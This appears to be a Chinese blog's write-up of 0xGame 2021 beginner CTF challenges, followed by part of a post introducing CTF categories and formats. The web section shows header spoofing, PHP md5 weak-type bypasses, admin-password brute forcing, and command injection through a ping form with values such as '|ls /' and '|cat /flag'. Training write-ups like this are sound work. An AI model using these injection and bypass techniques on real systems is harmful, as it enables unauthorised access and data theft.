language-Python" data-language="Python"><code class="language-Python">from z3 import *import libnump &#x3D; [Int(&#39;x%d&#39;%i) for i in range(0,32)]num &#x3D; [Int(&#39;u%d&#39;%i) for i in range(0,8)]s &#x3D; Solver()for i in range(0,32):    s.add(p[i] &gt; 0x20)    s.add(p[i] &lt; 127)s.add(2 * p[5] + 8225 - p[0] - 9 * p[3] - p[4] - p[9] + p[10] - 6 * p[11] - p[13] - 3 * p[14] - 5 * p[15] &#x3D;&#x3D; 5643)s.add(3 * p[14] + 8 * p[10] -3  * p[2] - 6 * p[0] + 8225 - p[1] - 2 * p[5] + 3 * p[8] - 8 * p[11] + 4 * p[12] - 6 * p[15] &#x3D;&#x3D; 6620)s.add(-5 * p[12] - 7 * p[6] - 3 * p[1] + 8225 - 2 * p[0] - p[2] - 5 * p[3] - 7 * p[4] - 6 * p[5] - 2 * p[8] + 6 * p[13] &#x3D;&#x3D; 5538)s.add(2 * p[5] + 2 * p[1] + 8225 - 2 * p[0] - 2 * p[3] + 3 * p[4] - 2 * p[8] - p[10] - p[12] - 2 * p[14] - 2 * p[15] &#x3D;&#x3D; 7693)s.add(-6 * p[14] + 8225 - 2 * p[1] - 2 * p[2] - 9 * p[3] + 2 * p[4] - 5 * p[7] + 2 * p[8] - 9 * p[9] - 4 * p[10] - 6 * p[15] &#x3D;&#x3D; 4735)s.add(9 * p[14] - 7 * p[10] + 8 * p[9] + 5 * p[0] + 8225 - p[2] + p[5] - 5 * p[6] - 8 * p[11] - p[12] - 9 * p[15] &#x3D;&#x3D; 7060)s.add(p[13] - 5 * p[7] - 3 * p[2] - 3 * p[0] + 8225 - 4 * p[1] - 4 * p[4] - p[6] + 9 * p[10] - 2 * p[14] - 6 * p[15] &#x3D;&#x3D; 5864)s.add(-9 * p[14] - 3 * p[10] + 9 * p[1] - 6 * p[0] + 8225 - 5 * p[3] - 4 * p[7] - 2 * p[11] - 2 * p[12] + p[13] + 9 * p[15] &#x3D;&#x3D; 7393)s.add(6 * p[9] - 5 * p[8] - 3 * p[6] + 9 * p[2] + 8225 - p[4] + 3 * p[5] - 7 * p[7] + 7 * p[10] - 2 * p[13] - p[14] &#x3D;&#x3D; 8442)s.add(8 * p[6] - 7 * p[2] + 8225 - 8 * p[1] - p[3] + 6 * p[4] - p[7] + 5 * p[8] - 4 * p[10] - p[14] + 7 * p[15] &#x3D;&#x3D; 8376)for i in range(0,32,4):    s.add(num[i&#x2F;&#x2F;4] &#x3D;&#x3D; (p[i] + (p[i+1] * 256) + (p[i+2] * 65536) + (p[i+3] * 16777216)))s.add(-22827 * num[4] + 21984 * num[1] - 38534 * num[5] - 32344 * num[0] &#x3D;&#x3D; -98460819657603)s.add(-38215 * num[2] - 37324 * num[4] - 8436 * num[5] + 15405 * num[0] &#x3D;&#x3D; -131665436206262)s.add(10926 * num[7] - 28942 * num[1] - 34572 * num[3] - 10538 * num[5] &#x3D;&#x3D; -121891239772992)s.add(-30117 * num[6] - 22990 * num[2] - 20471 * num[5] + 34494 * num[7] &#x3D;&#x3D; -57089882568260)s.add(-33112 * num[5] - 19335 * num[4] + 34348 * num[1] + 31445 * num[2] &#x3D;&#x3D; 56335531538050)s.add(-13566 * num[5] + 14758 * num[0] - 19814 * num[2] - 26447 * num[4] &#x3D;&#x3D; -81105980248303)s.add(25898 * num[5] - 15817 * num[1] + 20463 * num[7] - 33578 * num[0] &#x3D;&#x3D; -28860618440412)s.add(-35429 * num[7] + 36594 * num[2] - 28801 * num[6] - 14952 * num[3] &#x3D;&#x3D; -45384029412201)print(s.check())if s.check() &#x3D;&#x3D; sat:    flag &#x3D; b&quot;&quot;    result &#x3D; s.model()    for i in range(0,8):        print(num[i], result[num[i]])    for i in range(0,8):        flag +&#x3D; libnum.n2s(result[num[i]].as_long())[::-1]    flag &#x3D; &quot;0xGame&#123;&quot; + str(flag, encoding &#x3D; &quot;utf-8&quot;) + &quot;&#125;&quot;    print(flag)# 0xGame&#123;udydYCBxUB6vqsAt5VCs6LKDRqXLUhSW&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="看看我的头"><a href="#看看我的头" class="headerlink" title="看看我的头"></a>看看我的头</h3><p>这个题主要是考察请求头的结构大概了解每部分都有什么作用。</p><p>点进题目，先是打开方式不对，这很容易想到是请求方式不对，把GET请求方式改为POST，可以看到网页提示变化。再是提示要使用<code>N1k0la浏览器</code>。请求头中User-Agent向访问网站提供你所使用的浏览器类型、操作系统及版本、CPU 类型、浏览器渲染引擎、浏览器语言、浏览器插件等信息的标识。所以我们在这添加<code>N1k0la</code>。页面又发生变化，提示要本地登陆，所以我们添加X-Forwarded-For头去伪造我们的来源ip为本地ip：127.0.0.1 </p><p>然后会得到一串base64编码的数据解码后是</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'0xGame2021'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'X1cT34m'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$d</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Pupi1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token string single-quoted-string">'welcome to the0xGame2021'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$a</span><span class="token operator">===</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里是一个php的弱类型，md5碰撞，有多种方式去做</p><ol><li>md5()返回32位字符串，若均为<strong>0e</strong>开头可被认为是科学计数法表示的数字<strong>0</strong></li><li>md5()处理不了数组，会报错并返回NULL值。所以2个变量的md5值会相同</li><li>因为这里没有对是否传入变量进行判断，所以不传入md5处理的那2个变量，md5() 会直接输出<code>d41d8cd98f00b204e9800998ecf8427e</code> 代表空。</li><li>当然也可以直接传入2个一样的值 :-)</li></ol><h3 id="看看你能登陆吗"><a href="#看看你能登陆吗" class="headerlink" title="看看你能登陆吗"></a>看看你能登陆吗</h3><p>这个题主要是为了让新生熟悉burpsuit的操作，了解web渗透的本质是信息搜集。</p><p>题目说了登陆的关键词，自然想到可能存在后台，直接试常见的后台路径，或者使用目录扫描器扫描后台路径。发现<code>/admin</code>存在访问发现后台。有提示说密码是4位纯数字，常识可知后台的用户名大部分为admin，所以我们爆破密码。这里可以使用burpsuit，或者python写脚本，只是这里密码故意设为0310（出题人的生日，嘻嘻  所以在爆破密码时要注意0开头的4个数字也是合理的。爆破登陆即可。</p><h3 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h3><p>Robots协议了解一下。</p><p>robots.txt会被放在网站根目录下，告诉爬虫哪些不能爬，哪些能爬。 直接访问</p><p><code>/robots.txt</code>得到提示4ll.html，之后直接访问<code>/4ll.html</code>F12查看网页源代码，即可得到。</p><h3 id="爱ping才会赢"><a href="#爱ping才会赢" class="headerlink" title="爱ping才会赢"></a>爱ping才会赢</h3><p>这个题主要考察linux下的命令执行。</p><p>首先发现带有Ping字样的按钮是不可点击的，F12后将对应处的disabled=”disabled”删除即可点中。</p><p>这里实现ping的功能猜测是使用了调用系统命令的函数，所以我们可以进行命令拼接。</p><p>在linux中; |等<strong>连接符</strong>可连接两个独立语句并执行</p><p><code>|ls /</code>所以我们传入这个就可以查看根目录下的文件，找到flag后直接传入<code>|cat /flag</code>即可</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Crypto-Sign-in"><a href="#Crypto-Sign-in" class="headerlink" title="Crypto Sign in"></a>Crypto Sign in</h3><p>下载附件，阅读一下入门指南，最后就有flag。</p><h3 id="CuteCaesar"><a href="#CuteCaesar" class="headerlink" title="CuteCaesar"></a>CuteCaesar</h3><p>这题其实拿到附件，可以直接复制附件嗷呜嗷呜的内容去必应搜索，就能找到相关内容，可以知道需要兽语解码，当然第一天之后给了hint，大家也都很快找到了这个解码器。解码之后是</p><pre class="line-numbers language-none"><code class="language-none">0aJdph&#123;fdhvdu_1v_q0w_fxwh&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里根据题目名字，就可以知道是凯撒加密，百度找一个凯撒密码的解密器，位移量是3，解密即可。</p><h3 id="manycode"><a href="#manycode" class="headerlink" title="manycode"></a>manycode</h3><p>这题套娃层数有点多，给大家添堵了，在这里道歉了。一开始的层数更多，后来想了想有些编码不是很常用，就去了两层，并且给了提示，搜索ctf常见编码，一个个比照就可以一层层解密。主要希望大家能掌握Base64、32、16这三种常见编码的形式。</p><p>首先是aaencode，找一个在线解码器即可，网上说的在控制台运行会报错，可能是js的新语法规定 “_” 不能定义变量。然后就是三层base解码，依次是base16，base32，base64。最后就可以得到flag。</p><h3 id="ezVigenere"><a href="#ezVigenere" class="headerlink" title="ezVigenère"></a>ezVigenère</h3><p>这题的做法很多，有的同学是写程序爆破key，有的同学是根据最后flag的格式0xGame，从而推断key为abc，当然也有同学找了一个网址，里面的key默认是abc，直接解密（大意了，忘改key了）。这里给大家推荐一个网站，网站是通过词频分析，破解维吉尼亚密码的，直接复制进去解密即可。<a href="https://www.guballa.de/vigenere-solver">https://www.guballa.de/vigenere-solver</a></p><h3 id="MyFunction"><a href="#MyFunction" class="headerlink" title="MyFunction"></a>MyFunction</h3><p>一个函数，这个函数是已知$y=x\ln x$,求$x$的结果。<br>这个题是模仿西电新生赛的函数题出的，那边用的是$y=e^x$，这个函数有反函数$y=\ln x$。但$y=x\ln x$没有反函数，但根据这个函数在$[1,+∞)$单调增，因此我们一个一个枚举它的值就行了。可能要考虑一下浮点误差(但实测并不需要)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> math <span class="token keyword">import</span> logs<span class="token operator">=</span><span class="token string">""</span>D<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"output.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>D<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    y<span class="token operator">=</span><span class="token builtin">float</span><span class="token punctuation">(</span>D<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>x<span class="token operator">*</span>log<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">-</span>y<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">0.003</span><span class="token punctuation">:</span>            s<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token comment">#0xGame&#123;YouH4veKn0wedPy7honL081s&lt;y=ln(x)>InM47hs&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不过多数人是Excel打表、或者一个一个算的。直接开脚本写的不多。</p><h3 id="Class-8"><a href="#Class-8" class="headerlink" title="Class 8"></a>Class 8</h3><p>八种古典密码（可能确实出得有点脑洞了）</p><pre class="line-numbers language-none"><code class="language-none">第1、6位是盲文第2、7位是跳舞的小人第3位是猪圈密码第4、11、16位是手机九键键盘第5、9、14位是莫尔斯电码第8、12位是银河字母第10、15位是培根密码第13位是电脑键盘，cfgb之间围着的是V<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这道题一开始打算出规则的单词的，但后面就出得不规则了。主要是第13位、第15位出问题出得比较多。第15位确实有两种解法，因此第15位是<code>O</code>最后也算对了。</p><p>flag:<code>0xGame&#123;CLASSLNRDDLDVTNB&#125;</code>或<code>0xGame&#123;CLASSLNRDDLDVTOB&#125;</code></p><h3 id="ABC-Of-RSA"><a href="#ABC-Of-RSA" class="headerlink" title="ABC Of RSA"></a>ABC Of RSA</h3><p>这个题是后面加的。主要是给新生入门一下RSA。。。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">在RSA加密中，已知：p<span class="token operator">=</span><span class="token number">9677</span>q<span class="token operator">=</span><span class="token number">9241</span>e<span class="token operator">=</span><span class="token number">10009</span>求解密指数d不超过<span class="token number">4000</span>万的正值，用十进制表示，包上0xGame<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>提交。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>百度百科上就有很多关于RSA的加密方法和解密方法。如果用上Crypto包，是非常好做的。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>p<span class="token punctuation">,</span>q<span class="token operator">=</span><span class="token number">9677</span><span class="token punctuation">,</span><span class="token number">9241</span>phi<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>inverse<span class="token punctuation">(</span><span class="token number">10009</span><span class="token punctuation">,</span>phi<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#39982249</span><span class="token comment">#flag是0xGame&#123;39982249&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也有很多学弟学妹们用的是逆元的定义：$10009d= 1 +k \phi$做出来的，通过枚举$k$，找到了$d$的值。。不过这一方法在下一个RSA中就不太适用了，因为下一题的$k$很大，没法枚举了。</p><h3 id="BlackGiveRSA"><a href="#BlackGiveRSA" class="headerlink" title="BlackGiveRSA"></a>BlackGiveRSA</h3><p>一个RSA题目，看到$n$比较小，那么$n$的值直接放入网站/yafu/sagemath中分解就行了。<br>分解出$p=1175078221,q=1435756429$。然后对输出内容一段一段解密，再<code>long_to_bytes</code>连接起来，就是flag了。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>p<span class="token punctuation">,</span>q<span class="token operator">=</span><span class="token number">1175078221</span><span class="token punctuation">,</span><span class="token number">1435756429</span>n<span class="token punctuation">,</span>phi<span class="token operator">=</span>p<span class="token operator">*</span>q<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d<span class="token operator">=</span>inverse<span class="token punctuation">(</span><span class="token number">10007</span><span class="token punctuation">,</span>phi<span class="token punctuation">)</span>cipher<span class="token operator">=</span><span class="token punctuation">[</span>    <span class="token number">1150947306854980854</span><span class="token punctuation">,</span>    <span class="token number">243703926267532432</span><span class="token punctuation">,</span>    <span class="token number">1069319314811079682</span><span class="token punctuation">,</span>    <span class="token number">688582941857504686</span><span class="token punctuation">,</span>    <span class="token number">670683629344243145</span><span class="token punctuation">,</span>    <span class="token number">1195068175327355214</span>    <span class="token punctuation">]</span>m<span class="token operator">=</span><span class="token string">b""</span><span class="token keyword">for</span> c <span class="token keyword">in</span> cipher<span class="token punctuation">:</span>    m<span class="token operator">+=</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token comment">#0xGame&#123;ChuTiRenDeQQShiJiShangJiuShiQDeZhi&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag解出来：“出题人的QQ实际上就是q的值。”，各位学弟学妹们可以看看自己QQ是不是素数，平均30几个QQ号就有一个是素数。</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Sign-in"><a href="#Sign-in" class="headerlink" title="Sign in"></a>Sign in</h3><p>直接看RULES就行</p><h3 id="A-translate-draft"><a href="#A-translate-draft" class="headerlink" title="A translate draft"></a>A translate draft</h3><p>下载附件，打开提示需要输入密码，是伪加密。扔进winhex，搜索504B0102，往后看加密位置，是0900，更改为0000。打开文件，将word文档解压出来，打开，下拉到最下方，有一段空白，全选更改字体颜色为红色可以看到b32加密的串，解出前半段flag。将word改为zip，打开发现HiddenBy13.txt，内容为rot13加密的后半段flag。</p><h3 id="认真的血"><a href="#认真的血" class="headerlink" title="认真的血"></a>认真的血</h3><p>NTFS文件流隐写，使用winrar解压文件，使用ntfsstreameditor扫描得到flag.txt，内容为ROT47加密，解密得flag。</p><h3 id="Kakurennbo"><a href="#Kakurennbo" class="headerlink" title="Kakurennbo"></a>Kakurennbo</h3><p>光标在文本内停留，按→键会发现有明显的阻滞感。这显然是0宽隐写。验证：在kali下使用vim打开文本，可以发现0宽字符。在线解密<a href="http://330k.github.io/misc_tools/unicode_steganography.html">http://330k.github.io/misc_tools/unicode_steganography.html</a></p><p>可以得到W型栅栏加密过的flag。<a href="http://www.atoolbox.net/Tool.php?Id=777%E8%A7%A3%E5%AF%86%EF%BC%8C%E6%A0%8F%E6%95%B021%E5%BE%97%E5%88%B0flag%E3%80%82">http://www.atoolbox.net/Tool.php?Id=777解密，栏数21得到flag。</a></p><h3 id="EzAlgorithm"><a href="#EzAlgorithm" class="headerlink" title="EzAlgorithm"></a>EzAlgorithm</h3><p>一个简单的算法题：因为第$i$级楼梯可以通过第$i-1,i-2,i-3$级楼梯到达，因此到达第$i$级楼梯的走法等于到达第$i-1$级楼梯的走法加上到达第$i-2$级楼梯的走法加上到达第$i-3$级楼梯的走法。</p><p>不过在这之前，我们要判断一下楼梯有没有坏掉。如果楼梯坏掉了，那么我们就直接把到达那一级楼梯的方法数记为$0$就行。</p><p>这边需要注意的是，由于模数$1435756429$比<code>C/C++ int</code>的最大值的一半要大，那这里需要开<code>long long</code>解决。</p><p>这是解题代码（C语言的，C++/Python也可以做。），最后是十个测试点的答案。需要注意的是有一个点有点坑，因为那个点它第一级楼梯就是坏的：</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include&lt;stdio.h&gt;long long f[4000000]&#x3D;&#123;0&#125;,v[4000000]&#x3D;&#123;0&#125;;int n,k;int main()&#123;FILE *fp&#x3D;fopen(&quot;testdata10.in&quot;,&quot;r&quot;);&#x2F;&#x2F;这边的数字从1到10挨个修改，运行一遍就行FILE *gp&#x3D;fopen(&quot;result.out&quot;,&quot;a&quot;);int i,j;fscanf(fp,&quot;%d%d&quot;,&amp;n,&amp;k);for(i&#x3D;1;i&lt;&#x3D;k;i++)&#123;int x;fscanf(fp,&quot;%d&quot;,&amp;x);v[x]&#x3D;1;&#125;if(!v[1]) f[1]&#x3D;1;if(!v[2]) f[2]&#x3D;f[1]+1;if(!v[3]) f[3]&#x3D;f[1]+f[2]+1;for(i&#x3D;4;i&lt;&#x3D;n;i++)&#123;if(v[i]&#x3D;&#x3D;1)f[i]&#x3D;0;elsef[i]&#x3D;(f[i-1]+f[i-2]+f[i-3])%1435756429;&#125;fprintf(gp,&quot;%lld\n&quot;,f[n]%1435756429);fclose(fp);fclose(gp);&#125;&#x2F;&#x2F;13 98 47 3359124 1205125 834118675 1289432148 1087983205 1176572515 566575482<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这些数加起来模$1435756429$的值为$651977145$，所以flag为<code>0xGame&#123;651977145&#125;</code>。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 解题记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF简介</title>
      <link href="/2021/10/09/CTF%E7%AE%80%E4%BB%8B/"/>
      <url>/2021/10/09/CTF%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="一、CTF简介"><a href="#一、CTF简介" class="headerlink" title="一、CTF简介"></a>一、CTF简介</h1><p>  Capture The Flag（以下简称”CTF”）,顾名思义，即是夺取旗帜，由于相关介绍已经比较完全完全，其简介可见百度知道:<a href="https://baike.baidu.com/item/CTF/9548546?fr=aladdin">CTF</a>词条。</p><h1 id="二、CTF的题目类型"><a href="#二、CTF的题目类型" class="headerlink" title="二、CTF的题目类型"></a>二、CTF的题目类型</h1><p>​    CTF的题目类型大致包括以下五种： <a href="#Web">Web</a>，<a href="#Pwn">Pwn</a>，<a href="#Misc">Misc</a>， <a href="#Reverse">Reverse</a>，<a href="#Crypto">Crypto</a></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>​    Web类题目大部分情况下和网、Web、HTTP等相关技能有关。主要考察选手对于Web攻防的一些知识技巧。诸如<code>SQL注入</code>、<code>XSS</code>、<code>代码执行</code>、<code>代码审计</code>等等都是很常见的考点。一般情况下Web题目只会给出一个能够访问的URL。部分题目会给出附件.</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>​    Pwn类题目重点考察选手对于<code>二进制漏洞的挖掘和利用</code>能力，其考点也通常在<code>堆栈溢出</code>、<code>格式化漏洞</code>、<code>UAF</code>、<code>Double Free</code>等常见二进制漏洞上。选手需要根据题目中给出的二进制可执行文件进行逆向分析，找出其中的漏洞并进行利用，编写对应的漏洞攻击脚本(<code>Exploit</code>)，进而对主办方给出的远程服务器进行攻击并获取flag通常来说Pwn类题目给出的远程服务器信息为<code>nc IP_ADDRESS PORT</code>，例如<code>nc 1.2.3.4 4567</code>这种形式，表示在<code>1.2.3.4</code>这个IP的<code>4567</code>端口上运行了该题目</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><pre><code>Misc意为杂项，即不包含在以上分类的题目都会放到这个分类。题目会给出一个附件。选手下载该附件进行分析，最终得出flag</code></pre><p>   常见的题型有图片隐写、视频隐写、文档隐写、流量分析、协议分析、游戏、IoT相关等等。五花八门，种类繁多。</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><p>​    Reverse题目考察选手<code>逆向工程</code>能力。题目会给出一个可执行二进制文件，有些时候也可能是Android的APK安装包。选手需要逆向给出的程序，分析其程序工作原理。最终根据程序行为等获得flag。</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>​    Crypto类题目考察选手对<code>密码学</code>相关知识的了解程度，诸如<code>RSA</code>、<code>AES</code>、<code>DES</code>等都是密码学题目的常客。有些时候也会给出一个加密脚本和密文，根据加密流程逆推出明文。</p><h1 id="三、CTF的比赛形式"><a href="#三、CTF的比赛形式" class="headerlink" title="三、CTF的比赛形式"></a>三、CTF的比赛形式</h1><p>  CTF的比赛形式主要包括以下几种：<a href="#%E7%90%86%E8%AE%BA%E7%B1%BB">理论类</a>，[Jeopardy 解题]( #Jeopardy 解题)，[AwD 攻防](# AwD 攻防)，[RHG 自动化](#RHG 自动化)，[RW 真实世界](#RW 真实世界)，[KoH 抢占山头](#KoH 抢占山头)，[MIX 混合](#Mix  混合)</p><h2 id="理论类"><a href="#理论类" class="headerlink" title="理论类"></a>理论类</h2><p>​    理论题多见于国内比赛，通常为选择题。包含单选及多选，选手需要根据自己所学的相关理论知识进行作答。最终得出分数。理论部分通常多见于初赛或是初赛之前的海选</p><h2 id="Jeopardy-解题"><a href="#Jeopardy-解题" class="headerlink" title="Jeopardy 解题"></a>Jeopardy 解题</h2><p>​    参赛队伍可以通过互联网或者现场网络参与，参数队伍通过与在线环境交互或文件离线分析，解决网络安全技术挑战获取相应分值，类似于 ACM 编程竞赛、信息学奥林匹克赛，根据总分和时间来进行排名。 不同的是这个解题模式一般会设置 一血(First Blood) 、 二血(Second Blood) 、 三血(Third Blood) ，也即最先完成的前三支队伍会获得额外分值，所以这不仅是对首先解出题目的队伍的分值鼓励，也是一种团队能力的间接体现。 当然还有一种流行的计分规则是设置每道题目的初始分数后，根据该题的成功解答队伍数，来逐渐降低该题的分值，也就是说如果解答这道题的人数越多，那么这道题的分值就越低。最后会下降到一个保底分值后便不再下降。一般称之为动态积分 题目类型主要包含 Web 网络攻防 、 RE 逆向工程 、 Pwn 二进制漏洞利用 、 Crypto 密码攻击以及 Misc 安全杂项 这五个类别，个别比赛会根据题目类型进行扩展。</p><h2 id="AwD-攻防"><a href="#AwD-攻防" class="headerlink" title="AwD 攻防"></a>AwD 攻防</h2><p>​    <strong>A</strong>ttack <strong>w</strong>ith <strong>D</strong>efense(AwD)全称攻防模式，在攻防模式CTF赛制中，参赛队伍连接到同一个网络空间。主办方会预先为每个参赛队分配要防守的主机，该主机称之为GameBox，每个队伍之间的GameBox配置及漏洞是完全一致的，选手需要防护自己的GameBox不被攻击的同时挖掘漏洞并攻击对手服务来得分。在AwD中主办方会运行一个名为Checker的程序定时检测选手的GameBox的运行状态。若检测到状态不对则判定该GameBox宕机，按照规则扣除一定分数。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续24至48小时左右），同时也比团队之间的分工配合与合作。 AwD通常仅包含Web及Pwn两种类型的题目。每个队伍可能会分到多个GameBox，随着比赛的进行，最早的GameBox可能会下线，同时会上线新的GameBox。</p><h2 id="RHG-自动化"><a href="#RHG-自动化" class="headerlink" title="RHG 自动化"></a>RHG 自动化</h2><p>​    <strong>R</strong>obo <strong>H</strong>acking <strong>G</strong>ame(RHG)该利用人工智能或是AI或是自动化攻击程序来全自动的挖掘并利用漏洞，考验选手对于漏洞理解以及工程化能力。比赛开始前(一般为1-4周左右)主办方会给出测试环境以及相关接口文档。选手需要编写自动化程序来请求接口获取题目相关信息，该类程序通常称之为bot，在程序中全自动访问并挖掘目标漏洞，完成利用漏洞攻击并获取flag的过程。获取到的flag也由程序自动化提交。RHG因为是由bot全自动进行工作，所以比赛开始即可视为结束。剩下的一切全看参赛选手编写的自动化bot的工作情况。 比赛过程中不允许选手对bot进行任何的操作(包括debug/patch等等)。选手仅能看到自己的bot完成了哪些题。目前的得分情况等等。</p><h2 id="RW-真实世界"><a href="#RW-真实世界" class="headerlink" title="RW 真实世界"></a>RW 真实世界</h2><p>​    <strong>R</strong>eal <strong>W</strong>orld(RW) 首次于2018年长亭科技主办的RealWorldCTF中出现，该赛制着重考察选手在面对真实的环境下的漏洞挖掘与利用能力。通常RW模式出题也会围绕着能够应用于真实渗透攻击当中的漏洞，一般来说RW常见题型为VM/Docker逃逸、针对浏览器的攻击、针对IoT/Car等设备的攻击，Web类攻击等等 在RW赛制中会有一个Show Time，当选手认为自己已经可以完成题目时，选手可以在比赛平台上提交展示申请，由工作人员根据申请先后顺序进行展示排期。选手展示之前需要上台并连接相关网络，同时现场大屏会切换至目标的正常页面。选手确认连接并测试OK之后开始计时。一般情况下上台攻击的时间为5分钟，选手一旦完成攻击现场大屏幕会实时看到攻击的效果，此时裁判会根据效果是否符合题目要求来判定该题是否完成。如5在攻击时间内依然未能看到展示效果则认为本次攻击失败。现如今为了防止选手恶意排期。通常会有一个队伍总展示次数(例如在2019年数字经济云安全公测大赛中每个队伍只允许上台展示30次)，选手也需要尽可能保证上台之后攻击的成功率 